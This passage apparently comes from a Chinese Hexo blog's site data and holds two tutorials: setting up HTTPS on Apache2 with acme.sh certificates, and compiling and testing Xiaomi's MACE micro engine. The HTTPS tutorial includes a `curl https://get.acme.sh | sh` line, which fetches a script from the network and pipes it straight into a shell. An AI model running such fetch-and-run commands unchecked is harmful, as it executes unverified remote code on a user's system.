class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 这个要是开启状态on，默认就是on的</span></span><br><span class=\"line\">SSLEngine on</span><br><span class=\"line\"><span class=\"comment\"># 各证书文件路径，配置为你刚才安装时自己设置的路径，一共5个，注意注释掉原有配置</span></span><br><span class=\"line\">SSLCertificateFile       /etc/apache2/ssl/test.com-cert.pem</span><br><span class=\"line\">SSLCertificateKeyFile    /etc/apache2/ssl/test.com-key.pem</span><br><span class=\"line\"></span><br><span class=\"line\">SSLCertificateChainFile  /etc/apache2/ssl/test.com-fullchain.pem</span><br><span class=\"line\"></span><br><span class=\"line\">SSLCACertificatePath     /etc/apache2/ssl/</span><br><span class=\"line\">SSLCACertificateFile     /etc/apache2/ssl/test.com-fullchain.pem</span><br></pre></td></tr></table></figure>\n\n<p>记得:wq保存退出。最后刷新配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a2ensite default-ssl.conf</span><br><span class=\"line\"><span class=\"comment\"># 会提示你重载Apache服务</span></span><br><span class=\"line\">service apache2 reload</span><br></pre></td></tr></table></figure>\n\n<p>再用浏览器打开<a href=\"https://test.com,完美.当然,你需要保证你的服务器是开启了443端口的,默认情况下一般都没问题.用/\">https://test.com，完美。当然，你需要保证你的服务器是开启了443端口的，默认情况下一般都没问题。用</a> <code>netstat -lp</code> 命令测试一下，看到Local Address里有https就可以了。</p>\n<h3 id=\"开小灶\"><a href=\"#开小灶\" class=\"headerlink\" title=\"开小灶\"></a>开小灶</h3><p>一般来说，我们需要将HTTP访问强制重定向到HTTPS，咋搞？</p>\n<p>1、检查开启相关模块：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a2enmod rewrite</span><br><span class=\"line\">a2enmod ssl <span class=\"comment\"># 这个刚才启用过了就无需再执行了</span></span><br></pre></td></tr></table></figure>\n\n<p>2、修改文件HTTP配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/apache2/sites-available/000-default.conf</span><br></pre></td></tr></table></figure>\n\n<p>3、在80端口节点下增加如下三行（注意是增加不是直接复制粘贴啊！）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;VirtualHost *:80&gt;</span><br><span class=\"line\">    RewriteEngine On</span><br><span class=\"line\">    RewriteCond %&#123;HTTPS&#125; off</span><br><span class=\"line\">    RewriteRule (.*) https://%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125;</span><br><span class=\"line\">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>\n\n<p>4、保存后重启Apache即可：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service apache2 restart</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li><a href=\"https://github.com/acmesh-official/acme.sh/wiki/%E8%AF%B4%E6%98%8E\">aceme.sh文档</a></li>\n<li><a href=\"https://github.com/acmesh-official/acme.sh/wiki/Deploy-ssl-certs-to-apache-server\">Deploy-ssl-certs-to-apache-server</a></li>\n<li><a href=\"https://stackoverflow.com/questions/16200501/http-to-https-apache-redirection\">http-to-https-apache-redirection</a></li>\n</ul>\n<p>文档里讲解了大部分使用说明，但一些细节没提到，会导致部署失败。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>本文仅记录无套路搞定网站HTTPS的方法。网上搜索的资料实在太杂乱了，就连<strong>acme.sh</strong>官方文档也不够详尽。</p>\n</blockquote>\n<p>主要就三步：生成证书、安装证书、配置SSL。下文以Ubuntu 16.04（版本不重要） + Apache2为例。默认已经安装<code>crontab</code>、<code>openssl</code>等基本工具。网站目录也是默认的 <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;</strong> 。</p>\n<h3 id=\"生成证书\"><a href=\"#生成证书\" class=\"headerlink\" title=\"生成证书\"></a>生成证书</h3><p>1、先做准备工作：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 进入服务器的用户（一般是root）目录然后创建文件夹</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p ~/.acme.sh/</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/.acme.sh/</span><br><span class=\"line\"><span class=\"comment\"># 配置一下别名，等下方便用</span></span><br><span class=\"line\"><span class=\"built_in\">alias</span> acme.sh=~/.acme.sh/acme.sh</span><br></pre></td></tr></table></figure>\n\n<p>2、安装<strong>acme.sh</strong>，它可以帮你搞定免费证书：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 此时已经在~/.acme.sh/目录下，开始安装</span></span><br><span class=\"line\">curl https://get.acme.sh | sh</span><br><span class=\"line\"><span class=\"comment\"># 安装过程可能会提示socat没装，那你就装一下，装完再重新执行一次上面的安装命令</span></span><br><span class=\"line\">apt-get install socat</span><br></pre></td></tr></table></figure>\n\n<p>3、生成证书，以 <strong>test.com</strong> 域名作为下文示例（当然你需要改成你自己的）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">acme.sh --issue -d test.com --apache</span><br></pre></td></tr></table></figure>\n\n<p>到此证书生成完毕。可以看到命令执行后会提示Success。</p>\n<h3 id=\"安装证书\"><a href=\"#安装证书\" class=\"headerlink\" title=\"安装证书\"></a>安装证书</h3><p>1、进入apache安装目录创建存放证书的文件夹：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Ubuntu通过仓库安装的Apache默认就在这，如果你不在这，那么请自行进入相应目录</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /etc/apache2</span><br><span class=\"line\"><span class=\"comment\"># 创建一个目录等会安装证书，其实路径都无所谓，自定义的</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> ssl</span><br></pre></td></tr></table></figure>\n\n<p>2、开始安装证书，这是一个带参数的一次执行命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 这里的3个文件名也是自定义的，自己能区分即可，但后缀最好保持.pem</span></span><br><span class=\"line\">acme.sh --install-cert -d test.com \\</span><br><span class=\"line\">--cert-file      /etc/apache2/ssl/test.com-cert.pem  \\</span><br><span class=\"line\">--key-file       /etc/apache2/ssl/test.com-key.pem  \\</span><br><span class=\"line\">--fullchain-file /etc/apache2/ssl/test.com-fullchain.pem \\</span><br><span class=\"line\">--reloadcmd      <span class=\"string\">&quot;service apache2 force-reload&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"配置SSL\"><a href=\"#配置SSL\" class=\"headerlink\" title=\"配置SSL\"></a>配置SSL</h3><p>1、检查并开启SSL模块：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a2enmod ssl</span><br><span class=\"line\"><span class=\"comment\"># 然后最好重启一下Apache服务</span></span><br><span class=\"line\">service apache2 restart</span><br></pre></td></tr></table></figure>\n\n<p>2、修改SSL配置文件（<strong>关键步骤</strong>）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /etc/apache2/sites-available</span><br><span class=\"line\"><span class=\"comment\"># 这里为了方便直接用vim编辑了，你自己有别的方式修改也可以</span></span><br><span class=\"line\">vim default-ssl.conf</span><br></pre></td></tr></table></figure>\n\n<p>打开default-ssl.conf文件后，重点关注这几个配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 这个要是开启状态on，默认就是on的</span></span><br><span class=\"line\">SSLEngine on</span><br><span class=\"line\"><span class=\"comment\"># 各证书文件路径，配置为你刚才安装时自己设置的路径，一共5个，注意注释掉原有配置</span></span><br><span class=\"line\">SSLCertificateFile       /etc/apache2/ssl/test.com-cert.pem</span><br><span class=\"line\">SSLCertificateKeyFile    /etc/apache2/ssl/test.com-key.pem</span><br><span class=\"line\"></span><br><span class=\"line\">SSLCertificateChainFile  /etc/apache2/ssl/test.com-fullchain.pem</span><br><span class=\"line\"></span><br><span class=\"line\">SSLCACertificatePath     /etc/apache2/ssl/</span><br><span class=\"line\">SSLCACertificateFile     /etc/apache2/ssl/test.com-fullchain.pem</span><br></pre></td></tr></table></figure>\n\n<p>记得:wq保存退出。最后刷新配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a2ensite default-ssl.conf</span><br><span class=\"line\"><span class=\"comment\"># 会提示你重载Apache服务</span></span><br><span class=\"line\">service apache2 reload</span><br></pre></td></tr></table></figure>\n\n<p>再用浏览器打开<a href=\"https://test.com,完美.当然,你需要保证你的服务器是开启了443端口的,默认情况下一般都没问题.用/\">https://test.com，完美。当然，你需要保证你的服务器是开启了443端口的，默认情况下一般都没问题。用</a> <code>netstat -lp</code> 命令测试一下，看到Local Address里有https就可以了。</p>\n<h3 id=\"开小灶\"><a href=\"#开小灶\" class=\"headerlink\" title=\"开小灶\"></a>开小灶</h3><p>一般来说，我们需要将HTTP访问强制重定向到HTTPS，咋搞？</p>\n<p>1、检查开启相关模块：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a2enmod rewrite</span><br><span class=\"line\">a2enmod ssl <span class=\"comment\"># 这个刚才启用过了就无需再执行了</span></span><br></pre></td></tr></table></figure>\n\n<p>2、修改文件HTTP配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/apache2/sites-available/000-default.conf</span><br></pre></td></tr></table></figure>\n\n<p>3、在80端口节点下增加如下三行（注意是增加不是直接复制粘贴啊！）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;VirtualHost *:80&gt;</span><br><span class=\"line\">    RewriteEngine On</span><br><span class=\"line\">    RewriteCond %&#123;HTTPS&#125; off</span><br><span class=\"line\">    RewriteRule (.*) https://%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125;</span><br><span class=\"line\">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>\n\n<p>4、保存后重启Apache即可：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service apache2 restart</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li><a href=\"https://github.com/acmesh-official/acme.sh/wiki/%E8%AF%B4%E6%98%8E\">aceme.sh文档</a></li>\n<li><a href=\"https://github.com/acmesh-official/acme.sh/wiki/Deploy-ssl-certs-to-apache-server\">Deploy-ssl-certs-to-apache-server</a></li>\n<li><a href=\"https://stackoverflow.com/questions/16200501/http-to-https-apache-redirection\">http-to-https-apache-redirection</a></li>\n</ul>\n<p>文档里讲解了大部分使用说明，但一些细节没提到，会导致部署失败。</p>\n"},{"layout":"post","title":"Mace-micro引擎编译与测试","subtitle":"移动端AI计算框架。","date":"2020-10-24T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n![](https://github.com/XiaoMi/mace/raw/master/docs/mace-logo.png)\n\n## 官方简介\n\n**Mobile AI Compute Engine (MACE)** 是一个专为移动端异构计算平台(支持Android, iOS, Linux, Windows)优化的神经网络计算框架。\n主要从以下的角度做了专门的优化：\n\n* 性能\n  * 代码经过NEON指令，OpenCL以及Hexagon HVX专门优化，并且采用[Winograd算法](https://arxiv.org/abs/1509.09308)来进行卷积操作的加速。\n    此外，还对启动速度进行了专门的优化。\n* 功耗\n  * 支持芯片的功耗管理，例如ARM的big.LITTLE调度，以及高通Adreno GPU功耗选项。\n* 系统响应\n  * 支持自动拆解长时间的OpenCL计算任务，来保证UI渲染任务能够做到较好的抢占调度，从而保证系统UI的相应和用户体验。\n* 内存占用\n  * 通过运用内存依赖分析技术，以及内存复用，减少内存的占用。另外，保持尽量少的外部依赖，保证代码尺寸精简。\n* 模型加密与保护\n  * 模型保护是重要设计目标之一。支持将模型转换成C++代码，以及关键常量字符混淆，增加逆向的难度。\n* 硬件支持范围\n  * 支持高通，联发科，以及松果等系列芯片的CPU，GPU与DSP(目前仅支持Hexagon)计算加速。CPU模式支持Android, iOS, Linux等系统。\n* 模型格式支持\n  * 支持[TensorFlow](https://github.com/tensorflow/tensorflow)，[Caffe](https://github.com/BVLC/caffe)和[ONNX](https://github.com/onnx/onnx)等模型格式。\n\n## Micro Controllers\n\n上面的简介摘自[官方GitHub介绍](https://github.com/XiaoMi/mace/blob/master/README_zh.md)，可以让大家基本了解什么是mace引擎，它是一个移动端的AI计算框架。随着谷歌Tensorflow Lite的推广，越来越多的移动应用都将部分AI计算能力迁移至端侧，这些机器学习的算法都是运行在应用层的。但大多数系统层面的计算，例如省电优化（根据应用使用习惯）、睡眠监测、运动行为识别、语音唤醒手机等，为了保证低功耗，必须放在底层，这样计算过程中就无需唤醒上层的一系列进程，只等有结果时才唤醒并上报数据。\n\n有多底层呢？通常来说就是BP侧，在HAL层以下，逻辑基本运行在类似DSP这样的处理器上，部分工作需要开发人员和硬件驱动打交道。mace框架支持将TF模型文件转换成C++代码并打包成micro组件，方便我们集成。\n\n## 编译\n\n官方文档（[https://mace.readthedocs.io/en/latest/micro-controllers/basic_usage.html](https://mace.readthedocs.io/en/latest/micro-controllers/basic_usage.html)）写得比较详尽，但一些细节和注意点还是只有实践过程中才会发现。我的系统是Ubuntu 20.04，部分依赖安装起来稍微麻烦一点（mace官方要求的依赖很多版本很旧）。\n\n先配置基础环境，要装的东西挺多的，按官方给的版本号安装即可（[https://mace.readthedocs.io/en/latest/installation/env_requirement.html](https://mace.readthedocs.io/en/latest/installation/env_requirement.html)）。下面只提一些注意点。\n\n1、安装Python 2.7：Ubuntu 18.04就不自带Python 2.x了，默认是3.x，所以一定要自己手动安装Python 2.7，注意配置python和pip命令默认对应的版本为2.x。虽然mace官方文档写的3.6也可以编，但是我试过，各种失败。\n\n2、安装Bazel 0.13.x（实测0.13.0和0.13.1都行）：由于Ubuntu直接用apt安装bazel的话版本会非常高，最后会导致编译失败。Ubuntu的话直接到bazel官方GitHub下载对应版本的deb文件来安装即可：[https://github.com/bazelbuild/bazel/releases?after=0.16.1](https://github.com/bazelbuild/bazel/releases?after=0.16.1)\n\n```bash\nsudo dpkg -i bazel_0.13.1-linux-x86_64.deb\n```\n\n3、由于我只在手机BP侧运行micro代码，且基于Tensorflow的模型文件转换，所以官方文档中提到的Android NDK、ADB和Docker这里都不需要安装，除此之外都最好安装完。\n\n配置好各种环境后，就可以根据basic_usage中的步骤拉取mace代码，并执行转换命令：\n\n```bash\n# 直接执行，不需要改\ngit clone https://github.com/XiaoMi/mace.git\ncd mace/\ngit fetch --all --tags --prune\ntag_name=`git describe --abbrev=0 --tags`\ngit checkout tags/${tag_name}\n# 转换脚本（保证是Python 2.x版本）\npython tools/python/convert.py --config=xxx.yml --enable_micro\n```\n\n这里的xxx.yml是模型转换的配置文件，可以参考官方示例：[https://github.com/XiaoMi/mace-models](https://github.com/XiaoMi/mace-models)\n\n转换成功后，在mace/build/xxx/model目录下面会有转换成功的产物，解压xxx.tar.gz压缩包即可得到micro代码。\n\n## 测试\n\n如果每次都将micro代码集成到底层打包再进行模型测试，那太麻烦了，效率低下。因此，我们可以将其直接运行在PC上来进行输入数据mock，这个是官方文档没有提到的，需要我们自己修改CMake配置文件并添加测试代码。\n\n我用CLion直接打开micro文件夹，导入后会自动加载CMakeLists文件，然而肯定是编不过的，需要对各目录下的CMakeLists稍作修改，可以直接根据错误提示来。由于不同模型转换得到的C++代码可能会有一些差异，但大致应该是差不多的，比如我这个模型转换后就只需要修改ops/CMakeLists.txt，注释掉其中不存在的源文件（因为你的模型可能不需要这些代码，所以刚才的convert脚本给你删掉了，但CMakeLists里又没做调整，应该是脚本没考虑周全吧）。示例：\n\n```cmake\nset(MICRO_OPS_SRCS\n#  shape.cc\n#  reduce.cc\n  reshape.cc\n  matmul.cc\n#  nhwc/depthwise_conv_2d_ref.cc\n#  nhwc/conv_2d_c4_s4.cc\n#  nhwc/depthwise_conv_2d_kb3_s4.cc\n#  nhwc/pooling_ref.cc\n#  nhwc/conv_2d_c3_s4.cc\n#  nhwc/conv_2d_ref.cc\n  nhwc/depthwise_conv_2d_kb4_s4.cc\n  nhwc/depthwise_conv_2d_kb1_s4.cc\n  nhwc/base/depthwise_conv_2d_base.cc\n  nhwc/base/conv_2d_base.cc\n  nhwc/base/filter_op_base.cc\n  nhwc/base/pooling_base.cc\n#  nhwc/depthwise_conv_2d_kb2_s4.cc\n#  nhwc/conv_2d_c2_s4.cc\n#  nhwc/batch_norm.cc\n  nhwc/pooling_s4.cc\n  bias_add.cc\n  softmax.cc\n#  eltwise.cc\n  utils/gemm.cc\n  utils/crumb_utils.cc\n  utils/gemv.cc\n  utils/activation.cc\n#  expand_dims.cc\n#  squeeze.cc\n  activation.cc\n)\n\nadd_library(micro_ops\n  ${MICRO_OPS_SRCS}\n)\ntarget_link_libraries(micro_ops\n  micro_base\n  micro_framework\n)\n\nadd_library(micro_ops_for_test\n  ${MICRO_OPS_SRCS}\n)\ntarget_link_libraries(micro_ops_for_test\n  micro_base\n  micro_framework_for_optest\n)\ntarget_compile_options(micro_ops_for_test PUBLIC -fPIC)\n```\n\n编译错误提示找不到的，直接注释掉即可。接下来就可以自己编写测试代码来验证模型输出了，具体可以参考官方文档basic_usage最后一节。比如我这里在micro目录下添加了一个主入口测试文件main_test.cc和一个依赖文件my_test_utils.cc（包括.h头文件），只需要修改一下同目录下的CMakeLists（这个文件也是micro的顶层编译配置）即可：\n\n```cmake\n# 追加配置即可\n# main_test_srcs、micro_test_run_lib、micro_test_run都是自定义的名字\nfile(GLOB main_test_srcs my_test_utils.cc)\nadd_library(micro_test_run_lib\n  ${main_test_srcs}\n)\nadd_executable(micro_test_run main_test.cc)\n# 这里必须链接micro_engine_c，这样才能调用mace的API\ntarget_link_libraries(micro_test_run\n  micro_test_run_lib\n  micro_engine_c\n)\n```\n","source":"_posts/2020-10-25-Mace-micro引擎编译与测试.md","raw":"---\nlayout:     post\ntitle:      Mace-micro引擎编译与测试\nsubtitle:   移动端AI计算框架。\ndate:       2020-10-25\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - AI\n    - 鼓捣折腾\n    - Android\n---\n\n![](https://github.com/XiaoMi/mace/raw/master/docs/mace-logo.png)\n\n## 官方简介\n\n**Mobile AI Compute Engine (MACE)** 是一个专为移动端异构计算平台(支持Android, iOS, Linux, Windows)优化的神经网络计算框架。\n主要从以下的角度做了专门的优化：\n\n* 性能\n  * 代码经过NEON指令，OpenCL以及Hexagon HVX专门优化，并且采用[Winograd算法](https://arxiv.org/abs/1509.09308)来进行卷积操作的加速。\n    此外，还对启动速度进行了专门的优化。\n* 功耗\n  * 支持芯片的功耗管理，例如ARM的big.LITTLE调度，以及高通Adreno GPU功耗选项。\n* 系统响应\n  * 支持自动拆解长时间的OpenCL计算任务，来保证UI渲染任务能够做到较好的抢占调度，从而保证系统UI的相应和用户体验。\n* 内存占用\n  * 通过运用内存依赖分析技术，以及内存复用，减少内存的占用。另外，保持尽量少的外部依赖，保证代码尺寸精简。\n* 模型加密与保护\n  * 模型保护是重要设计目标之一。支持将模型转换成C++代码，以及关键常量字符混淆，增加逆向的难度。\n* 硬件支持范围\n  * 支持高通，联发科，以及松果等系列芯片的CPU，GPU与DSP(目前仅支持Hexagon)计算加速。CPU模式支持Android, iOS, Linux等系统。\n* 模型格式支持\n  * 支持[TensorFlow](https://github.com/tensorflow/tensorflow)，[Caffe](https://github.com/BVLC/caffe)和[ONNX](https://github.com/onnx/onnx)等模型格式。\n\n## Micro Controllers\n\n上面的简介摘自[官方GitHub介绍](https://github.com/XiaoMi/mace/blob/master/README_zh.md)，可以让大家基本了解什么是mace引擎，它是一个移动端的AI计算框架。随着谷歌Tensorflow Lite的推广，越来越多的移动应用都将部分AI计算能力迁移至端侧，这些机器学习的算法都是运行在应用层的。但大多数系统层面的计算，例如省电优化（根据应用使用习惯）、睡眠监测、运动行为识别、语音唤醒手机等，为了保证低功耗，必须放在底层，这样计算过程中就无需唤醒上层的一系列进程，只等有结果时才唤醒并上报数据。\n\n有多底层呢？通常来说就是BP侧，在HAL层以下，逻辑基本运行在类似DSP这样的处理器上，部分工作需要开发人员和硬件驱动打交道。mace框架支持将TF模型文件转换成C++代码并打包成micro组件，方便我们集成。\n\n## 编译\n\n官方文档（[https://mace.readthedocs.io/en/latest/micro-controllers/basic_usage.html](https://mace.readthedocs.io/en/latest/micro-controllers/basic_usage.html)）写得比较详尽，但一些细节和注意点还是只有实践过程中才会发现。我的系统是Ubuntu 20.04，部分依赖安装起来稍微麻烦一点（mace官方要求的依赖很多版本很旧）。\n\n先配置基础环境，要装的东西挺多的，按官方给的版本号安装即可（[https://mace.readthedocs.io/en/latest/installation/env_requirement.html](https://mace.readthedocs.io/en/latest/installation/env_requirement.html)）。下面只提一些注意点。\n\n1、安装Python 2.7：Ubuntu 18.04就不自带Python 2.x了，默认是3.x，所以一定要自己手动安装Python 2.7，注意配置python和pip命令默认对应的版本为2.x。虽然mace官方文档写的3.6也可以编，但是我试过，各种失败。\n\n2、安装Bazel 0.13.x（实测0.13.0和0.13.1都行）：由于Ubuntu直接用apt安装bazel的话版本会非常高，最后会导致编译失败。Ubuntu的话直接到bazel官方GitHub下载对应版本的deb文件来安装即可：[https://github.com/bazelbuild/bazel/releases?after=0.16.1](https://github.com/bazelbuild/bazel/releases?after=0.16.1)\n\n```bash\nsudo dpkg -i bazel_0.13.1-linux-x86_64.deb\n```\n\n3、由于我只在手机BP侧运行micro代码，且基于Tensorflow的模型文件转换，所以官方文档中提到的Android NDK、ADB和Docker这里都不需要安装，除此之外都最好安装完。\n\n配置好各种环境后，就可以根据basic_usage中的步骤拉取mace代码，并执行转换命令：\n\n```bash\n# 直接执行，不需要改\ngit clone https://github.com/XiaoMi/mace.git\ncd mace/\ngit fetch --all --tags --prune\ntag_name=`git describe --abbrev=0 --tags`\ngit checkout tags/${tag_name}\n# 转换脚本（保证是Python 2.x版本）\npython tools/python/convert.py --config=xxx.yml --enable_micro\n```\n\n这里的xxx.yml是模型转换的配置文件，可以参考官方示例：[https://github.com/XiaoMi/mace-models](https://github.com/XiaoMi/mace-models)\n\n转换成功后，在mace/build/xxx/model目录下面会有转换成功的产物，解压xxx.tar.gz压缩包即可得到micro代码。\n\n## 测试\n\n如果每次都将micro代码集成到底层打包再进行模型测试，那太麻烦了，效率低下。因此，我们可以将其直接运行在PC上来进行输入数据mock，这个是官方文档没有提到的，需要我们自己修改CMake配置文件并添加测试代码。\n\n我用CLion直接打开micro文件夹，导入后会自动加载CMakeLists文件，然而肯定是编不过的，需要对各目录下的CMakeLists稍作修改，可以直接根据错误提示来。由于不同模型转换得到的C++代码可能会有一些差异，但大致应该是差不多的，比如我这个模型转换后就只需要修改ops/CMakeLists.txt，注释掉其中不存在的源文件（因为你的模型可能不需要这些代码，所以刚才的convert脚本给你删掉了，但CMakeLists里又没做调整，应该是脚本没考虑周全吧）。示例：\n\n```cmake\nset(MICRO_OPS_SRCS\n#  shape.cc\n#  reduce.cc\n  reshape.cc\n  matmul.cc\n#  nhwc/depthwise_conv_2d_ref.cc\n#  nhwc/conv_2d_c4_s4.cc\n#  nhwc/depthwise_conv_2d_kb3_s4.cc\n#  nhwc/pooling_ref.cc\n#  nhwc/conv_2d_c3_s4.cc\n#  nhwc/conv_2d_ref.cc\n  nhwc/depthwise_conv_2d_kb4_s4.cc\n  nhwc/depthwise_conv_2d_kb1_s4.cc\n  nhwc/base/depthwise_conv_2d_base.cc\n  nhwc/base/conv_2d_base.cc\n  nhwc/base/filter_op_base.cc\n  nhwc/base/pooling_base.cc\n#  nhwc/depthwise_conv_2d_kb2_s4.cc\n#  nhwc/conv_2d_c2_s4.cc\n#  nhwc/batch_norm.cc\n  nhwc/pooling_s4.cc\n  bias_add.cc\n  softmax.cc\n#  eltwise.cc\n  utils/gemm.cc\n  utils/crumb_utils.cc\n  utils/gemv.cc\n  utils/activation.cc\n#  expand_dims.cc\n#  squeeze.cc\n  activation.cc\n)\n\nadd_library(micro_ops\n  ${MICRO_OPS_SRCS}\n)\ntarget_link_libraries(micro_ops\n  micro_base\n  micro_framework\n)\n\nadd_library(micro_ops_for_test\n  ${MICRO_OPS_SRCS}\n)\ntarget_link_libraries(micro_ops_for_test\n  micro_base\n  micro_framework_for_optest\n)\ntarget_compile_options(micro_ops_for_test PUBLIC -fPIC)\n```\n\n编译错误提示找不到的，直接注释掉即可。接下来就可以自己编写测试代码来验证模型输出了，具体可以参考官方文档basic_usage最后一节。比如我这里在micro目录下添加了一个主入口测试文件main_test.cc和一个依赖文件my_test_utils.cc（包括.h头文件），只需要修改一下同目录下的CMakeLists（这个文件也是micro的顶层编译配置）即可：\n\n```cmake\n# 追加配置即可\n# main_test_srcs、micro_test_run_lib、micro_test_run都是自定义的名字\nfile(GLOB main_test_srcs my_test_utils.cc)\nadd_library(micro_test_run_lib\n  ${main_test_srcs}\n)\nadd_executable(micro_test_run main_test.cc)\n# 这里必须链接micro_engine_c，这样才能调用mace的API\ntarget_link_libraries(micro_test_run\n  micro_test_run_lib\n  micro_engine_c\n)\n```\n","slug":"Mace-micro引擎编译与测试","published":1,"updated":"2024-03-25T07:31:25.864Z","comments":1,"photos":[],"link":"","_id":"cluaufh150038the66b635q9x","content":"<p><img src=\"https://github.com/XiaoMi/mace/raw/master/docs/mace-logo.png\"></p>\n<h2 id=\"官方简介\"><a href=\"#官方简介\" class=\"headerlink\" title=\"官方简介\"></a>官方简介</h2><p><strong>Mobile AI Compute Engine (MACE)</strong> 是一个专为移动端异构计算平台(支持Android, iOS, Linux, Windows)优化的神经网络计算框架。<br>主要从以下的角度做了专门的优化：</p>\n<ul>\n<li>性能<ul>\n<li>代码经过NEON指令，OpenCL以及Hexagon HVX专门优化，并且采用<a href=\"https://arxiv.org/abs/1509.09308\">Winograd算法</a>来进行卷积操作的加速。<br>此外，还对启动速度进行了专门的优化。</li>\n</ul>\n</li>\n<li>功耗<ul>\n<li>支持芯片的功耗管理，例如ARM的big.LITTLE调度，以及高通Adreno 